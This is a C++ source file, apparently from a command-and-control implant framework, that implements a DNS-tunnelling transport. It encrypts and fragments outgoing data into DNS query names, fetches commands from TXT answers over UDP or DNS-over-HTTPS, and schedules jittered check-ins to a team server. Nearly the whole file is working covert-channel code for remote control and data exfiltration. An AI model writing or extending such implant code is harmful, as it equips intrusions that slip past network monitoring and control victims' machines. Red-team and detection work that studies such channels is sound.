// DnsTransport.cpp
#include "DnsTransport.hpp"

#include "Core/Identity/SessionIdentity.hpp"
#include "Core/Comms/Transports/Dns/DnsWireCodec.hpp"
#include "Crypto/Engine/CryptoManager.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <utility>

namespace cleat {

	namespace {

		// 上行分片队列上限的**兜底默认**: 实际值取自 ChannelCaps,
		// 由 ChannelSpec/能力表按通道声明(/F.8: 以字节为主, 片数作次要护栏)
		constexpr size_t kMaxQueuedFrags = 128;
		// 每次交互的 UDP 接收超时与重试
		constexpr int kRecvTimeoutMs = 3000;
		constexpr int kMaxRecvAttempts = 3;
		// 用冗余换"上行准可靠"(k=2 时单片丢失率 p²); 服务端重组器按 idx 去重
		// (服务端实现), 重复片幂等。确定性保证需双端 ACK
		// 每帧仅末尾 1-2 片, 128 条目上限内无压力。
		constexpr int kUplinkSends = 2;

		// 拆 "host:port" -> host/port; 无端口默认 53
		void SplitHostPort(const std::string& s, std::string& host, uint16_t& port) {
			const auto pos = s.find(':');
			if (pos == std::string::npos) {
				host = s;
				port = 53;
			}
			else {
				host = s.substr(0, pos);
				port = static_cast<uint16_t>(std::atoi(s.c_str() + pos + 1));
			}
		}

	} // namespace

	DnsTransport::DnsTransport(INetworkOps& ops,
		std::unique_ptr<IHttpOps> doh_http)
		: ops_(ops), doh_http_(std::move(doh_http)) {
	}

	DnsTransport::~DnsTransport() {
		Disconnect();
		std::lock_guard<std::mutex> lock(mutex_);
		if (udp_sock_ >= 0) {
			ops_.CloseSocket(udp_sock_);
			udp_sock_ = -1;
		}
	}

	bool DnsTransport::Connect(const TransportConfig& cfg) {
		std::lock_guard<std::mutex> lock(mutex_);
		cfg_ = cfg;
		if (cfg_.dns_server.empty() || cfg_.domain.empty()) {
			CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam, "DnsTransport: 配置缺失 dns_server/domain");
			return false;
		}
		SplitHostPort(cfg_.dns_server, dns_host_, dns_port_);

		// DoH 模式解析: 配置优先, 编译期内嵌兜底(服务端 profile 字段后接)
		doh_url_ = cfg_.doh_url;
#ifdef CLEAT_DNS_DOH_URL
		if (doh_url_.empty()) {
			doh_url_ = CLEAT_DNS_DOH_URL;
		}
#endif
		if (!doh_url_.empty()) {
			LOG_INFO("DnsTransport: DoH 模式 resolver=" << doh_url_);
		}

		// UDP socket 仅在原生 DNS 模式需要; DoH 模式走 HTTP(POST RFC8484), UDP 路径
		// 整条停用(exchange 内 doh_url_ 非空即早返回), 故此处不建 —— 受限环境
		// (禁/无 UDP)下 DoH 仍可用, 不再被 建不出 UDP 误判为连接失败。
		if (doh_url_.empty() && udp_sock_ < 0) {
			udp_sock_ = ops_.CreateUdpSocket();
			if (udp_sock_ < 0) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "DnsTransport: CreateUdpSocket 失败");
				return false;
			}
		}

		// 探活: 一次空查询(服务器可达即视为成功); 响应若带数据不丢弃,
		// 入重组器/缓存供后续 Recv 消费(防"探活吞掉第一片命令")
		std::vector<uint8_t> down;
		const bool ok = exchange({}, down);
		connected_.store(ok);
		decrypt_fail_streak_ = 0;   // 新链路: 计数清零
		ClearDegraded();
		if (ok && !down.empty()) {
			std::vector<uint8_t> frame;
			if (reassembler_.Push(down, frame)) {
				pending_frame_ = std::move(frame);
			}
		}
		if (!ok) {
			LOG_WARN("DnsTransport: 探活失败 server=" << cfg_.dns_server
				<< " domain=" << cfg_.domain);
		}
		else {
			LOG_INFO("DnsTransport: 探活成功 server=" << cfg_.dns_server
				<< " domain=" << cfg_.domain);
		}
		return ok;
	}

	void DnsTransport::Disconnect() {
		connected_.store(false);
		decrypt_fail_streak_ = 0;   // 链路级状态, 关闭即作废
		ClearDegraded();
		std::lock_guard<std::mutex> lock(mutex_);
		// UDP socket 不随 Disconnect 关闭: UDP 无连接,
		// 源端口即服务端 peer 身份(TeamServer dns.go 按 raddr 键控, 下行队列与
		// 在途重组都挂在 peer 上)—— 重建 socket = 换端口 = 未发下行片成孤儿。
		// socket 生命周期归析构函数; 数据状态作废口径见下, 意图不受影响。
		// 下行数据状态: 全部作废( 原样 —— 陈旧下行帧跨会话交付是实测缺陷)
		reassembler_.Clear();
		pending_frame_.clear();
		slow_clock_.Reset();
		fast_clock_.Reset();
		if (doh_http_) {
			doh_http_->Reset();   // DoH 连接池/句柄随链路关闭回收
		}
		// 上行队列: 异会话残片就地作废,
		// 同会话片保留 —— 重连(同会话续命)后原片原序继续发。
		const uint64_t sid = SessionIdentity::Instance().GetSessionId();
		up_frags_.erase(std::remove_if(up_frags_.begin(), up_frags_.end(),
			[sid](const QueuedFrag& q) { return q.sid != sid; }), up_frags_.end());
	}

			void DnsTransport::NoteDecryptFailure() {
	MarkDegraded("downlink_decrypt_fail");
	if (++decrypt_fail_streak_ >= kDecryptFailThreshold) {
		CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "DnsTransport: 连续 " << decrypt_fail_streak_
			<< " 次下行解密失败(key_id/密钥不匹配?), 判定链路不可用, 强制重连");
		decrypt_fail_streak_ = 0;
		connected_.store(false);   // 判 Dead -> 上层按既有路径换候选/重连
	}
	}

	void DnsTransport::NoteDecryptSuccess() {
	decrypt_fail_streak_ = 0;
	ClearDegraded();
	}

	ChannelHealth DnsTransport::HealthNow() const {
	if (!connected_.load()) return ChannelHealth::Dead;
	return degraded_.load() ? ChannelHealth::Degraded : ChannelHealth::Healthy;
	}

	void DnsTransport::MarkDegraded(const char* why) {
	if (!degraded_.exchange(true)) {
		LOG_DEBUG("DnsTransport: Health=Degraded (" << why << ")");
	}
	}

	bool DnsTransport::IsConnected() const {
		return connected_.load();
	}

	bool DnsTransport::Send(const std::vector<uint8_t>& frame) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);
		send_structural_.store(false);   // 本次调用复位; Write 只读本次结果

		// 加密 -> 分片入队(真正的发送在 Recv 的交互中)
		std::vector<uint8_t> payload = frame;
		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> enc;
			if (!CryptoManager::Instance().Encrypt(frame, enc)) {
				CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "DnsTransport: 加密失败 (len=" << frame.size() << ")");
				return false;
			}
			payload = std::move(enc);
		}
		auto frags = DatagramCodec::Fragment(payload, dns::kMaxFragPayload);
		// B2-3: 分片超 255 片(空返回) = 载荷过大, 报错而非静默失败
		if (frags.empty()) {
			// **永久**失败标记: Write 据此如实报 Dropped 而非
			// Rejected —— Rejected 会被 OutboundSink 回插队首永久卡死出站队列。
			send_structural_.store(true);
			CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted, "DnsTransport: 载荷过大, 分片超 255 片上限 (len=" << payload.size() << ")");
			return false;
		}
		// **整帧预检**: 旧形态逐片入队+逐片丢队首 —— 同帧多片时
		// 队首很快变成**本帧自己的第 0 片**(自相残杀), 帧必然无法重组, 剩余分片继续
		// 浪费稀缺上行, 且 Send 仍返回 true 上层无感知。现以帧为单位判定: 放不下
		// **整体拒收**并上抛失败(OutboundSink 有失败留痕/重试语义), 队列里不产生残帧。
		const ChannelCaps caps = Caps();
		const size_t frag_cap = caps.maxQueuedUplinkFrags != 0 ? caps.maxQueuedUplinkFrags : kMaxQueuedFrags;
		if (up_frags_.size() + frags.size() > frag_cap) {
			overflow_.dropped_bytes += payload.size();   // 被拒整帧 = 因溢出未能上行的字节
			++overflow_.overflow_count;
			LOG_WARN("DnsTransport: 上行队列余量不足, 整帧拒收 (need=" << frags.size()
				<< ", queued=" << up_frags_.size() << ", cap=" << frag_cap
				<< ", overflow_count=" << overflow_.overflow_count << ")");
			return false;
		}
		for (auto& f : frags) {
			up_frags_.push_back(QueuedFrag{ std::move(f),
				SessionIdentity::Instance().GetSessionId(), kUplinkSends });
		}
		return true;
	}

	SendResult DnsTransport::Write(const std::vector<uint8_t>& frame) {
		// 覆写默认映射: "结构性超限"是永久失败, 必须与"本轮
		// 可重试"在类型上分开 —— 详见头文件。C5 硬约束不受影响: 两者都不是
		// ChannelFailure, 不驱动换候选/判死。
		const bool ok = Send(frame);
		if (ok) {
			return SendResult::Queued;   // 仅入队, 随下次 Pump 交互落线
		}
		if (!IsConnected()) {
			return SendResult::ChannelFailure;
		}
		if (send_structural_.load()) {
			// 整帧 > 255 片: 重试永远不会成功。报 Dropped(已消费)让出站队列继续
			// 流动 —— 报 Rejected 会被 OutboundSink 回插队首, 此后每轮 Flush 都卡
			// 同一帧, 队首阻塞静默瘫痪整条出站(含心跳)。Send 内已 ERROR 留痕。
			return SendResult::Dropped;
		}
		// 上行队列余量不足等: 随交互排空即可重试, 维持 Rejected。
		return SendResult::Rejected;
	}

	bool DnsTransport::Recv(std::vector<uint8_t>& frame, int /*timeout_ms*/) {
		if (!connected_.load()) {
			return false;
		}
		std::lock_guard<std::mutex> lock(mutex_);

		// 优先交付缓存帧(探活/先前交互返回的完整帧), 不等待节流
		if (!pending_frame_.empty()) {
			std::vector<uint8_t> payload = std::move(pending_frame_);
			pending_frame_.clear();
			if (CryptoManager::Instance().IsEnabled()) {
				std::vector<uint8_t> dec;
				if (!CryptoManager::Instance().Decrypt(payload, dec)) {
					NoteDecryptFailure();
					CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "DnsTransport: 缓存帧解密失败 (len=" << payload.size() << ")");
					return false;
				}
				frame = std::move(dec);
				NoteDecryptSuccess();   // 成功交付一帧 = 健康信号
			}
			else {
				frame = std::move(payload);
			}
			return true;
		}

		// 节流: 有上行数据待发/未注册时用 1s 快速交互(注册分片尽快送完),
		//       空闲时按心跳 base±jitter(check-in 节奏, SetConfig 可调)
		const bool fast = !up_frags_.empty()
			|| SessionIdentity::Instance().GetSessionId() == 0;
		if ((fast ? !fast_clock_.ShouldRun(true, false)
		          : !slow_clock_.ShouldRun(false, false))) {
			return false;
		}

		// 取一片上行数据(或空拉取)
		std::vector<uint8_t> up_frag;
		uint64_t frag_sid = 0;
		int frag_sends_left = 0;
		if (!up_frags_.empty()) {
			// 跨链路残片失效: 会话身份已变的片就地丢弃, 永不落线
			// 
			if (up_frags_.front().sid != SessionIdentity::Instance().GetSessionId()) {
				up_frags_.pop_front();
				return false;
			}
			frag_sid = up_frags_.front().sid;
			frag_sends_left = up_frags_.front().sends_left;
			up_frag = std::move(up_frags_.front().frag);
			up_frags_.pop_front();
		}

		std::vector<uint8_t> down_frag;
		if (!exchange(up_frag, down_frag)) {
			// 失败回队: 片没有离开本链路 —— 会话未变, 原片
			// 原序回到队首, 重连后照发。SendTo 失败 = 肯定没出去; 超时 = 查询
			// 可能已到、响应丢失 —— 重发为重复片, 服务端重组器按 idx 去重
			// (服务端实现), 已证实幂等。**不消耗重传额度**
			// (额度只在交互成功时消耗, 保证有进度)。
			if (!up_frag.empty()) {
				up_frags_.push_front(QueuedFrag{ std::move(up_frag), frag_sid,
					frag_sends_left });
			}
			connected_.store(false);   // 交互失败: 通知上层重连
			return false;
		}
		// 重发同一片, 服务端按 idx 去重幂等
		if (!up_frag.empty() && frag_sends_left > 1) {
			up_frags_.push_front(QueuedFrag{ std::move(up_frag), frag_sid,
				frag_sends_left - 1 });
		}
		if (down_frag.empty()) {
			return false;   // 无下行数据(非错误)
		}

		// 重组
		std::vector<uint8_t> payload;
		if (!reassembler_.Push(down_frag, payload)) {
		// 仅在**未收齐**时置位(此前误插在 Push 之前, 成功重组也会被标记)
		MarkDegraded("D7 fragment_incomplete");
			return false;   // 分片未收齐
		}

		// 解密
		if (CryptoManager::Instance().IsEnabled()) {
			std::vector<uint8_t> dec;
			if (!CryptoManager::Instance().Decrypt(payload, dec)) {
				NoteDecryptFailure();
				CLEAT_LOGE(ErrDom::Net, ErrCode::CryptoOpFailed, "DnsTransport: 下行解密失败 (len=" << payload.size() << ")");
				return false;
			}
			frame = std::move(dec);
			NoteDecryptSuccess();   // 成功交付一帧 = 健康信号(清零计数 + 清除 Degraded)
		}
		else {
			frame = std::move(payload);
		}
		return true;
	}

	void DnsTransport::Reset() {
		Disconnect();
	}

	bool DnsTransport::exchange(const std::vector<uint8_t>& up_frag,
		std::vector<uint8_t>& down_frag) {
		down_frag.clear();

		const std::string qname = build_qname(up_frag);
		const uint16_t id = next_id_++;
		const std::vector<uint8_t> query = build_query(id, qname);

		// DNS wire 应答 —— 线格式零变化, 服务端无感; UDP 路径整段停用。
		if (!doh_url_.empty()) {
			if (!doh_http_) {
				doh_http_ = CreateHttpOps();   // 真实 WinHTTP 路径; 测试经构造注入
				if (!doh_http_) {
					CLEAT_LOGE(ErrDom::Net, ErrCode::NotSupported, "DnsTransport: DoH ops 创建失败");
					return false;
				}
			}
			static const std::vector<std::pair<std::string, std::string>> kDohHeaders = {
				{ "Content-Type", "application/dns-message" },
				{ "Accept", "application/dns-message" },
			};
			std::vector<uint8_t> resp;
			if (!doh_http_->RoundTrip(HttpMethod::Post, doh_url_, query, resp,
				kRecvTimeoutMs, &kDohHeaders)) {
				LOG_WARN("DnsTransport: DoH 事务失败 url=" << doh_url_);
				return false;
			}
			// 应答体 = DNS wire: 复用既有解析(ID 校验/跳 question/TXT RDATA)
			return parse_txt_response(resp, query, down_frag);
		}

		if (ops_.SendTo(udp_sock_, query.data(), query.size(),
			dns_host_, dns_port_) < 0) {
			LOG_WARN("DnsTransport: SendTo 失败 err=" << ops_.GetLastSocketError());
			return false;
		}

		ops_.SetSocketRecvTimeout(udp_sock_, kRecvTimeoutMs);
		std::vector<uint8_t> buf(4096);
		for (int attempt = 0; attempt < kMaxRecvAttempts; ++attempt) {
			const int n = ops_.RecvFrom(udp_sock_, buf.data(), buf.size());
			if (n > 0) {
				buf.resize(static_cast<size_t>(n));
				if (parse_txt_response(buf, query, down_frag)) {
					return true;
				}
				// 非本事务的包(超时重传/其他): 忽略重试
				buf.resize(4096);
				continue;
			}
			const int err = ops_.GetLastSocketError();
			if (err == ops_.GetSocketErrorTimeout()) {
				LOG_WARN("DnsTransport: 响应超时");
				return false;
			}
			LOG_WARN("DnsTransport: RecvFrom 失败 err=" << err);
			return false;
		}
		LOG_WARN("DnsTransport: 响应解析多次失败");
		return false;
	}

	std::string DnsTransport::build_qname(const std::vector<uint8_t>& frag) const {
		//  线格式已移入 DnsWireCodec; 会话 id 在此处读取并显式传入
		// 
		return dns::BuildQname(frag, cfg_.domain,
			SessionIdentity::Instance().GetSessionId());
	}

	std::vector<uint8_t> DnsTransport::build_query(uint16_t id,
		const std::string& qname) const {
		return dns::BuildQuery(id, qname);   //  线格式移入 DnsWireCodec
	}

	bool DnsTransport::parse_txt_response(const std::vector<uint8_t>& resp,
		const std::vector<uint8_t>& query, std::vector<uint8_t>& txt) const {
		return dns::ParseTxtResponse(resp, query, txt);   //  线格式移入 DnsWireCodec
	}

	ChannelOverflowStats DnsTransport::TakeOverflowStats() {
	std::lock_guard<std::mutex> lock(mutex_);
	const ChannelOverflowStats s = overflow_;   // "取走"语义: 复位防重复上报
	overflow_ = ChannelOverflowStats{};
	return s;
	}

	std::unique_ptr<ITransport> CreateDnsTransport(INetworkOps& ops) {
		return std::make_unique<DnsTransport>(ops);
	}

} // namespace cleat
